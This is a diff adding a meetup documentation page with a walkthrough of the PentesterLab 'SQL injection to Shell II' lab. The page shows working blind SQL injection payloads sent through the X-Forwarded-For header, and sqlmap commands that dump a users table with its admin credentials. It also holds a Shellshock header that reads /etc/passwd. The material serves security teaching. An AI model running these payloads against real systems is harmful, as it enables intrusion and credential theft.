@@ -1,0 +1,554 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.23. PentesterLab From SQL injection to Shell II &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
+        <link rel="next" title="3.24. PentesterLab From SQL injection to Shell" href="from_sql_injection_to_shell.html"/>
+        <link rel="prev" title="3.22. Owning the Database with SQLMap" href="owning_database_with_sqlmap.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.23. PentesterLab From SQL injection to Shell II</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#how-sql-injection-ii-differs-from-i">3.23.1. how SQL injection II differs from I</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sql-ii-reconnaissance">3.23.2. SQL II reconnaissance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#testing-for-sql-injection">3.23.3. testing for SQL injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sqlmap-to-the-rescue">3.23.4. <code class="docutils literal"><span class="pre">sqlmap</span></code> to the rescue</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#uploading-the-vulnerable-php-script">3.23.5. uploading the vulnerable php script</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.23. PentesterLab From SQL injection to Shell II</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/from_sql_injection_to_shell_II.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="pentesterlab-from-sql-injection-to-shell-ii">
+<span id="pentesterlabsqli2shell2"></span><h1>3.23. PentesterLab From SQL injection to Shell II<a class="headerlink" href="#pentesterlab-from-sql-injection-to-shell-ii" title="Permalink to this headline">¶</a></h1>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell_II//">PentesterLab From SQL injection to Shell II</a> (the follow-on to <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell/">PentesterLab From SQL injection to Shell</a>).</p>
+<p>There are numerous online articles helpful to understand SQL injection: <a class="reference external" href="https://www.owasp.org/index.php/SQL_Injection">SQL Injection (OWASP)</a>, <a class="reference external" href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">SQL Injection Prevention Cheat Sheet (OWASP)</a>, <a class="reference external" href="http://www.sqlinjectionwiki.com/Default.aspx">SQL Injection Wiki</a>, <a class="reference external" href="http://resources.infosecinstitute.com/sql-injections-introduction/">What is an SQL Injection? SQL Injections: An Introduction (INFOSEC Institute)</a>, <a class="reference external" href="http://www.w3schools.com/sql/sql_injection.asp">SQL Injection (w3schools.com)</a>, and <a class="reference external" href="http://hakipedia.com/index.php/SQL_Injection">SQL Injection (HAKIPEDIA)</a>.</p>
+<p>For review of http headers and the http protocol, please consult <a class="reference internal" href="../html/http.html#http-vs-html"><span class="std std-ref">HTTP(S) vs HTML</span></a> or start with <a class="reference external" href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">Wikipedia Hypertext Transfer Protocol</a>. <a class="reference external" href="https://en.wikipedia.org/wiki/X-Forwarded-For">X-Forwarded-For</a> focuses on the SQL injection target.</p>
+<div class="section" id="how-sql-injection-ii-differs-from-i">
+<h2>3.23.1. how SQL injection II differs from I<a class="headerlink" href="#how-sql-injection-ii-differs-from-i" title="Permalink to this headline">¶</a></h2>
+<p>The setup looks much the same for both SQL injection exercises except for two key differences:</p>
+<ul>
+<li><p class="first">In SQL I the injection is performed on a query parameter:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl http://<span class="nv">$TARGET</span>/cat.php?id<span class="o">=</span><span class="nv">$INJECTION</span>
+</pre></div>
+</div>
+<p>whereas in SQL II the injection is done via the http header field X-Forwarded-For:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --header <span class="s2">&quot;X-Forwarded-For: </span><span class="nv">$INJECTION</span><span class="s2">&quot;</span> http://<span class="nv">$TARGET</span>/
+</pre></div>
+</div>
+<p>Vulnerable http header fields should not come as a complete surprise as the <a class="reference external" href="http://blog.cloudflare.com/inside-shellshock/">Shellshock bash exploit used the User-Agent header field</a>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl -H <span class="s2">&quot;User-Agent: () { :; }; /bin/cat /etc/passwd&quot;</span> http://example.com/
+</pre></div>
+</div>
+</li>
+<li><p class="first">SQL injection in SQL I is error-based (with visible error messages telling us there is a SQL injection) whereas in SQL II the injection is blind (having to resort to differences in delay between successful vs. unsuccessful queries).</p>
+</li>
+</ul>
+<p>How did Shell II turn the benign X-Forwarded-For field into an attack vector? It added stats.php to update stats based on client IP:</p>
+<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$ip</span><span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="nv">$results</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM stats where ip=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span>
+        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;UPDATE stats set count=count+1 where ip&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
+      <span class="k">else</span>
+        <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO stats (ip, count) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39;,1);</span>
+<span class="s2">  }</span>
+<span class="s2">?&gt;</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">SQL Injection Prevention Cheat Sheet (OWASP)</a> was not followed and lead to the SQL injection opportunity.</p>
+</div>
+<div class="section" id="sql-ii-reconnaissance">
+<h2>3.23.2. SQL II reconnaissance<a class="headerlink" href="#sql-ii-reconnaissance" title="Permalink to this headline">¶</a></h2>
+<p>We start with reconnaissance showing:</p>
+<ul class="simple">
+<li>nginx 0.7.67 web server</li>
+<li>running PHP/5.3.3-7+squeeze15</li>
+<li>on Debian Linux Squeeze (6.0.7) using kernel 2.6.32-5</li>
+</ul>
+<p>The nginx and php versions are obvious from the console listing below. But how did we get the Debian Linux 6.0.7 and specific kernel version? Well, we start with the php information. Debian <a class="reference external" href="https://lists.debian.org/debian-changes/2013/03/msg00009.html">Accepted php5 5.3.3-7+squeeze15</a> (the php version the vulnerable server uses) on 2013-03-04  and <a class="reference external" href="https://lists.debian.org/debian-changes/2013/07/msg00037.html">Accepted php5 5.3.3-7+squeeze16</a> (the following version) 2013-07-24. That tells us that the Debian version was prior to 2013-07-24. Looking at <a class="reference external" href="https://wiki.debian.org/DebianSqueeze">Debian Squeeze Releases and Updates</a> shows Debian Squeeze 6.0.8 was released 2013-10-20 (too late) but Squeeze 6.0.7 was released 2013-02-23 and likely was patched to php5 5.3.3-7+squeeze15 after installation. So the vulnerable server runs Debian Squeeze 6.0.7. Looking at the <a class="reference external" href="https://www.debian.org/News/2013/20130223">Debian 6.0.7 press release</a> shows linux-2.6 2.6.32-48 and a little searching showed the <a class="reference external" href="https://packages.debian.org/search?searchon=sourcenames&amp;keywords=linux-2.6">squeeze 2.6 kernel</a> used 2.6.32-5. It’s interesting how much information leaks out by providing software versions.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> nmap to see an nginx web server running on linux
+<span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$</span> sudo nmap -Pn -sV -O <span class="nv">$TARGET</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">PORT   STATE SERVICE VERSION</span>
+<span class="go">80/tcp open  http    nginx 0.7.67</span>
+<span class="go">MAC Address: 52:54:00:CD:D8:59 (QEMU Virtual NIC)</span>
+<span class="go">Device type: general purpose</span>
+<span class="go">Running: Linux 2.6.X</span>
+<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
+<span class="go">OS details: Linux 2.6.32</span>
+<span class="go">Network Distance: 1 hop</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="gp">hacker@kali:~$ #</span> HTTP HEADERS confirm nginx version, give PHP version
+<span class="gp">hacker@kali:~$ #</span>   Here is the http client request <span class="k">for</span> the header
+<span class="gp">hacker@kali:~$</span> cat &gt; head.txt &lt;&lt;EOF
+<span class="go">HEAD / HTTP/1.1</span>
+<span class="go">Host: vulnerable</span>
+<span class="go">Connection: close</span>
+
+<span class="go">EOF</span>
+<span class="gp">hacker@kali:~$</span> od -c head.txt
+<span class="go">0000000   H   E   A   D       /       H   T   T   P   /   1   .   1  \n</span>
+<span class="go">0000020   H   o   s   t   :       v   u   l   n   e   r   a   b   l   e</span>
+<span class="go">0000040  \n   C   o   n   n   e   c   t   i   o   n   :       c   l   o</span>
+<span class="go">0000060   s   e  \n  \n</span>
+<span class="go">0000064</span>
+<span class="gp">hacker@kali:~$ #</span>   socat <span class="k">for</span> the request/response <span class="o">(</span>changing <span class="se">\n</span> to <span class="se">\r\n</span><span class="o">)</span>
+<span class="gp">hacker@kali:~$ #</span>   netcat alternative requires a <span class="s2">&quot;sleep&quot;</span>
+<span class="gp">hacker@kali:~$ #</span>     <span class="o">{</span> cat head.txt<span class="p">;</span> sleep <span class="m">2</span><span class="p">;</span> <span class="o">}</span> <span class="p">|</span> ncat <span class="nv">$TARGET</span> <span class="m">80</span>
+<span class="gp">hacker@kali:~$</span> cat head.txt <span class="p">|</span> socat STDIO,ignoreeof TCP:<span class="nv">$TARGET</span>:80,crlf
+<span class="go">HTTP/1.1 200 OK</span>
+<span class="go">Server: nginx/0.7.67</span>
+<span class="go">Date: Fri, 14 Nov 2014 06:37:20 GMT</span>
+<span class="go">Content-Type: text/html</span>
+<span class="go">Connection: close</span>
+<span class="go">X-Powered-By: PHP/5.3.3-7+squeeze15</span>
+
+<span class="gp">hacker@kali:~$</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="testing-for-sql-injection">
+<h2>3.23.3. testing for SQL injection<a class="headerlink" href="#testing-for-sql-injection" title="Permalink to this headline">¶</a></h2>
+<p>The SQL injection involves setting the X-Forwarded-For field. Here are 3 simple ways of doing that:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># socat sending X-Forwarded-For</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+cat &gt; head.txt <span class="s">&lt;&lt;EOF</span>
+<span class="s">HEAD / HTTP/1.1</span>
+<span class="s">Host: vulnerable</span>
+<span class="s">X-Forwarded-For: 123.123.123.123</span>
+<span class="s">Connection: close</span>
+
+<span class="s">EOF</span>
+cat head.txt <span class="p">|</span> socat STDIO,ignoreeof TCP:<span class="nv">$TARGET</span>:80,crlf
+
+<span class="c1"># curl --header for X-Forwarded-For, --head only gets HEAD</span>
+curl -v --header <span class="s2">&quot;X-Forwarded-For: 123.123.123.123&quot;</span> --head http://<span class="nv">$TARGET</span>/
+
+<span class="c1"># wget --header for X-Forwarded-For, --server-response --spider --tries 1 only gets HEAD</span>
+wget --header <span class="s2">&quot;X-Forwarded-For: 123.123.123.123&quot;</span> --server-response <span class="se">\</span>
+     --spider --tries <span class="m">1</span> http://<span class="nv">$TARGET</span>/
+</pre></div>
+</div>
+<p>We’ll use <code class="docutils literal"><span class="pre">curl</span></code> to probe for SQL injection opportunities. First we’ll guess that the database is MySQL (which is often true for PHP-based systems). That means we’ll be using MySQL queries: if they work then we know it’s MySQL, if not we’ll have to try a different database.</p>
+<p>Since X-Forwarded-For is an IP it’s text and we’ll assume our injection closes the X-Forwarded-For field with a single quote mark. We try “hacker’” first and see there’s no change in the output. So then we try adding a “sleep(5)” and see a delay, confirming the SQL injection and a likely MySQL database. Here is the code you can cut-and-paste into your terminal session (except for the TARGET):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">XFF</span><span class="o">=</span><span class="s2">&quot;X-Forwarded-For: &quot;</span>
+<span class="nv">t1</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
+<span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39;&quot;</span>
+curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
+<span class="nv">t2</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;Elapsed time = </span><span class="k">$((</span> t2 <span class="o">-</span> t1 <span class="k">))</span><span class="s2"> seconds&quot;</span>
+<span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39; OR SLEEP(5) AND &#39;1&#39;=&#39;1&quot;</span>
+curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
+<span class="nv">t3</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;Elapsed time = </span><span class="k">$((</span> t3 <span class="o">-</span> t2 <span class="k">))</span><span class="s2"> seconds&quot;</span>
+</pre></div>
+</div>
+<p>Here is result of running the code above (showing the time delay):</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$ t1=$</span><span class="o">(</span>date +%s<span class="o">)</span>
+<span class="gp">hacker@kali:~$</span> <span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39;&quot;</span>
+<span class="gp">hacker@kali:~$</span> curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
+<span class="gp">hacker@kali:~$ t2=$</span><span class="o">(</span>date +%s<span class="o">)</span>
+<span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> <span class="s2">&quot;Elapsed time = </span><span class="k">$((</span> t2 <span class="o">-</span> t1 <span class="k">))</span><span class="s2"> seconds&quot;</span>
+<span class="go">Elapsed time = 0 seconds</span>
+<span class="gp">hacker@kali:~$</span> <span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39; OR SLEEP(5) AND &#39;1&#39;=&#39;1&quot;</span>
+<span class="gp">hacker@kali:~$</span> curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
+<span class="gp">hacker@kali:~$ t3=$</span><span class="o">(</span>date +%s<span class="o">)</span>
+<span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> <span class="s2">&quot;Elapsed time = </span><span class="k">$((</span> t3 <span class="o">-</span> t2 <span class="k">))</span><span class="s2"> seconds&quot;</span>
+<span class="go">Elapsed time = 5 seconds</span>
+</pre></div>
+</div>
+<p>Now we can clumsily play a game of “20 questions” with the database - if we guess right it will induce a delay or return immediately if we guess wrong. Let’s say we have inched along and now know there is a database called users with columns id, login, and password. We can enumerate the users by selecting id = 1 and asking if the length of login is 1, 2, 3, … on up until we get a delay at 5 (for “admin”). Then in a loop we can inquire about the value of each of the characters, going from 1 to 5: is it “a”, “b”, …  until the delay shows us the actual character. If we want to optimize the search, we can convert each character to a binary number and ask if each bit is a 1? That way takes less checks to determine that the letters are “a”, “d”, “m”, “i”, and “n”. Using bits is faster with ascii characters (which have 7 bits); it takes 7 guesses * 5 letters = 35 guesses. Guessing each letter would have taken 1+4+13+9+14=41 guesses (and it gets worse if you allow digits and special characters in the login). Here we show a query verifying the 3rd character of the first login is “m”:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">XFF</span><span class="o">=</span><span class="s2">&quot;X-Forwarded-For: &quot;</span>
+<span class="nv">t1</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
+<span class="nv">INJECT</span><span class="o">=</span><span class="s2">&quot;hacker&#39; OR if ( (SELECT substring(login,3,1) FROM users \</span>
+<span class="s2">WHERE id=1) = \&quot;m\&quot;, sleep(5),0) AND &#39;1=&quot;</span>
+curl --silent --header <span class="s2">&quot;</span><span class="si">${</span><span class="nv">XFF</span><span class="si">}${</span><span class="nv">INJECT</span><span class="si">}</span><span class="s2">&quot;</span> -o /dev/null http://<span class="nv">$TARGET</span>/
+<span class="nv">t2</span><span class="o">=</span><span class="k">$(</span>date +%s<span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;Elapsed time = </span><span class="k">$((</span> t2 <span class="o">-</span> t1 <span class="k">))</span><span class="s2"> seconds&quot;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="sqlmap-to-the-rescue">
+<h2>3.23.4. <code class="docutils literal"><span class="pre">sqlmap</span></code> to the rescue<a class="headerlink" href="#sqlmap-to-the-rescue" title="Permalink to this headline">¶</a></h2>
+<p>This is tedious and begs to be automated; <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> has done that. Give it a hint to use X-Forwarded-For and it will find the SQL injection, returning the database banner (so you’ll know the version).</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+    --banner --batch --output-dir <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[*] starting at 23:12:15</span>
+
+<span class="go">custom injection marking character (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q]</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">sqlmap identified the following injection points with a total of 120 HTTP(s) requests:</span>
+<span class="go">---</span>
+<span class="go">Place: (custom) HEADER</span>
+<span class="go">Parameter: X-Forwarded-For #1*</span>
+<span class="go">    Type: AND/OR time-based blind</span>
+<span class="go">    Title: MySQL &gt; 5.0.11 AND time-based blind</span>
+<span class="go">    Payload: &#39; AND SLEEP(5) AND &#39;YTeW&#39;=&#39;YTeW</span>
+<span class="go">---</span>
+<span class="go">[23:13:05] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">[23:13:05] [INFO] fetching banner</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">5.1.66-0+squeeze1</span>
+<span class="go">web application technology: PHP 5.3.3, Nginx</span>
+<span class="go">back-end DBMS: MySQL 5.0.11</span>
+<span class="go">banner:    &#39;5.1.66-0+squeeze1&#39;</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p>Now we continue on as before to list the databases, tables, and users.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+    --dbs --batch --output-dir <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">available databases [2]:</span>
+<span class="go">[*] information_schema</span>
+<span class="go">[*] photoblog</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+    -D photoblog --tables --batch --output-dir <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[4 tables]</span>
+<span class="go">+------------+</span>
+<span class="go">| categories |</span>
+<span class="go">| pictures   |</span>
+<span class="go">| stats      |</span>
+<span class="go">| users      |</span>
+<span class="go">+------------+</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="gp">hacker@kali:~$</span> sqlmap -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-Forwarded-For: *&quot;</span> <span class="se">\</span>
+    -D photoblog -T users --dump --batch --output-dir <span class="nv">$PWD</span>/sqlmap
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">Database: photoblog</span>
+<span class="go">Table: users</span>
+<span class="go">[1 entry]</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| id | login | password                                    |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="go">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span>
+<span class="go">+----+-------+---------------------------------------------+</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is pretty amazing, handling lots of corner cases. With it we now we have the admin/P4ssw0rd to gain access to the admin web pages.</p>
+</div>
+<div class="section" id="uploading-the-vulnerable-php-script">
+<h2>3.23.5. uploading the vulnerable php script<a class="headerlink" href="#uploading-the-vulnerable-php-script" title="Permalink to this headline">¶</a></h2>
